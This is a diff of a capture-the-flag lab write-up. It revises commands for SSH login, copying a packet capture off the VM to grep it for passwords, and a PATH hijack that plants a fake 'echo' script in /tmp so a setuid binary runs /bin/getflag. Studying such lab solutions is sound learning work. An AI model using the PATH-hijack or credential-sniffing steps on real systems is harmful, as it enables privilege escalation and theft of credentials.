@@ -34,7 +34,7 @@ tags: `sed..cut` or `awk`
 ```b
 > ssh -p 4242 level00@$(ifconfig|grep 'inet '|sed -n '2p'|cut -d' ' -f2)
                                               ^^^         ^^^
-> ssh -p 4242 level00@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}')
+> ssh -p 4242 level00@$(ifconfig|grep 'inet '|awk 'NR==2{print $2}')
                                               ^^^
 ```
 
@@ -210,17 +210,13 @@ Login
 ```
 
 ### Command list
-```b
-vm
-> ls -l
-> 👇 LOVE RECYCLING/ 👉 ifconfig|grep 'inet '|awk 'NR==2 {print $2}'
-> scp -P 4242 level02@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}'):/home/user/level02/level02.pcap $(pwd)
 
-host
-> hexdump -C level02.pcap 
-> xxd level02.pcap 
-> xxd level02.pcap | grep -i pass -A10 -B10
-> ❌ xxd level02.pcap | cut -d ' ' -f2-9 | tr -d ' '
+```b
+scp -P 4242 level02@$(ifconfig|grep 'inet '|awk 'NR==2{print $2}'):/home/user/level02/level02.pcap $(pwd)
+```
+```b
+hexdump -C level02.pcap | grep -i pass
+xxd level02.pcap        | grep -i pass
 ```
 
 Found a `.pcap` file
@@ -234,18 +230,10 @@ Found a `.pcap` file
 ```
 
 - `~.pcap` - Packet Capture
-  - a `.pcap` is used to store network packet data captured during network traffic monitoring
+  - is used to store network packet data captured during network traffic monitoring
 - Save the `.pcap` to Host
   - `scp` - secure copy - `scp username@ip:path _local_`
-- ❌ Inspect w/ `hexdump, xxd`
 
-```b
-### Host
-> hexdump -C level02.pcap 
-> xxd level02.pcap 
-> xxd level02.pcap | grep -i pass -A10 -B10
-> xxd level02.pcap | cut -d ' ' -f2-9 | tr -d ' '
-```
 
 - ✅ Use _Wireshark_ 
   - we do _Analyze - Follow - TCP Stream_ 
@@ -347,7 +335,7 @@ the saved set-user|group-ID of the calling process
 ```b
 > whereis getflag
 getflag: /bin/getflag
-> echo -e "#\!/bin/bash\n/bin/getflag" > /tmp/echo
+> echo -e "/bin/getflag" > /tmp/echo
 > chmod +x /tmp/echo
 > export PATH=/tmp:$PATH  👈 prepend tmp to get it checked first
 > ./level03
